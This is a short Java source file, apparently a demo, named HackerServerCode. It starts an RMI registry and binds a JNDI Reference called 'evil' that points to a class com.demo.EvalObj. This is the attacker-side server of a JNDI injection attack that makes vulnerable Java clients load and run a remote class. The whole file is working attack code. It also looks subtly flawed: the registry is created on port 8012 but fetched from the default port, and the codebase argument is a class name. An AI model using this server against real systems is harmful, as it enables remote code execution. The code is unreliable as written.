package com.demo;



import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class HackerServerCode {
    public static void main(String[] args) {
        try {
            LocateRegistry.createRegistry(8012);
            Registry registry = LocateRegistry.getRegistry();
            System.out.println("create rmi registry on port 8012");
            Reference reference = new Reference("com.demo.EvalObj", "com.demo.EvalObj", "com.demo.EvalObj");
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
            registry.bind("evil", referenceWrapper);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
